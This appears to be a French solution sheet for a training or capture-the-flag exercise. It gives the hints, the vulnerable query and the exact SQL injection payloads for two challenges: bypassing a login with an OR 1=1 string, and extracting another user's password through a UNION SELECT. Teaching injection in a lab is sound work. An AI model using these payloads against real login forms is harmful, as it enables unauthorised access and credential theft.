# Injection SQL 1 - Passer le login

mettre " pour avoir une erreur


* Solution:
    Mettre en username : " OR 1=1 OR ""="

Mais on est login en tant que "admin", pas l'autre user !

* Indice 1 :
    Injection SQL

* Indice 2 : 
    SELECT * FROM data.users WHERE username = "$username" AND password="$password"

# Injection SQL 2 - Récupérer le mot de passe de l'autre utilisateur

* Indice 1 : 
    SELECT * FROM data.users WHERE username = "$username" AND password="$password"
    (dur sans connaître le nom de la base !)

SELECT * FROM data.users WHERE username = "a" AND password="" UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin"

* Solution :
    Mettre en user : (n'importe quoi)
    Mettre en mdp : " UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin
